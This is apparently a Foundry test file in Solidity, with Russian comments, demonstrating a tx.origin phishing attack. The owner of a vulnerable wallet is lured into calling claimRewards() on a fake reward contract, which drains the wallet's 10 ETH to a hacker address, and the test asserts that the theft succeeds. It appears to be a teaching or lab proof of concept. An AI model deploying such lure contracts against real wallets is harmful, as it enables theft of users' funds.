// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableWallet.sol";
import "../src/AttackerContract.sol";

contract TxOriginRealTest is Test {
    VulnerableWallet wallet;
    AttackerContract fakeRewardContract;
    
    address owner = address(0x1);
    address hacker = address(0x2);

    function setUp() public {
        vm.deal(owner, 10 ether);

        // Используем prank с tx.origin, чтобы симулировать реального пользователя
        vm.prank(owner, owner);
        wallet = new VulnerableWallet{value: 10 ether}();

        vm.prank(hacker, hacker);
        fakeRewardContract = new AttackerContract(address(wallet), hacker);
    }

    function testExploit() public {
        console.log("=== BEFORE ATTACK ===");
        console.log("Wallet ETH:", address(wallet).balance);
        console.log("Hacker ETH:", hacker.balance);

        // --- ЭКСПЛУАТАЦИЯ ---
        // Владелец (EOA) кликает "Claim". msg.sender = owner, tx.origin = owner!
        vm.prank(owner, owner);
        fakeRewardContract.claimRewards();
        // ----------------------

        console.log("=== AFTER ATTACK ===");
        console.log("Wallet ETH:", address(wallet).balance);
        console.log("Hacker ETH:", hacker.balance);

        assertEq(address(wallet).balance, 0);
        assertEq(hacker.balance, 10 ether);
    }
}
